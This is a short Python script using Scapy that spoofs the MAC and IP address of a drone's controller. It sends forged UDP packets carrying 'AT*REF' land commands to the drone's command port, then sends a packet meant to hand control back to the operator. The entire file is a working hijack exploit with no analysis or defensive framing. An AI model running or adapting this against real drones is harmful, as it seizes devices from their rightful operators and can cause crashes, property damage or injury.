from scapy.all import *
from time import sleep

srcIP = '192.168.1.2'
dstIP = '192.168.1.1'
srcPort = 5556
dstPort = 5556
srcMAC = '58:44:98:13:80:6c'
dstMAC = '90:03:b7:e8:55:72'

#Land command: "AT*REF=1000000,290717696\r"

print "Sending spoofed land packets"

for i in range(1, 10):
	payload = "AT*REF=" + str(1000000+i) + ",290717696\r"
	print payload
	spoofed_packet = Ether(src=srcMAC, dst=dstMAC) / IP(src=srcIP, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
	sendp(spoofed_packet, iface="wlan0")
	sleep(0.3)

print "Wait 5 seconds before restoring control"

sleep(5)

print "Send a spoofed packet with seq=1 to restore control"

payload = "AT*REF=1,290717696\r"
print payload
spoofed_packet = Ether(src=srcMAC, dst=dstMAC) / IP(src=srcIP, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
sendp(spoofed_packet, iface="wlan0")
